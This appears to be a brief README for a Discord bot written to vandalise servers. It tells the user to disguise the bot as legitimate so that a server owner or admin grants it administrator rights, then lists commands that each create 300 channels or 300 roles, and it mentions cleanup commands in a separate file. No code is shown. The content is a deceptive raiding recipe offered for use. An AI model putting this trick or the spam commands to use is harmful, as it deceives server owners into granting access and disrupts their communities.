These are simple bot commands my friend wanted so he could mess with a server.

The bot need admin to work, just disguise your bot  to look legit and send the invite link to  the owner or someone with admin. then run the commands.
Use at your own risk.

prefix is '-'

-channel    -  makes 300 channels

-role       - makes 300 roles 
  
Just in case you did it in the wrong server because u were fucking around. i added commands to clean the mess. 
Check copy and paste 'help.txt'into 'index.js'
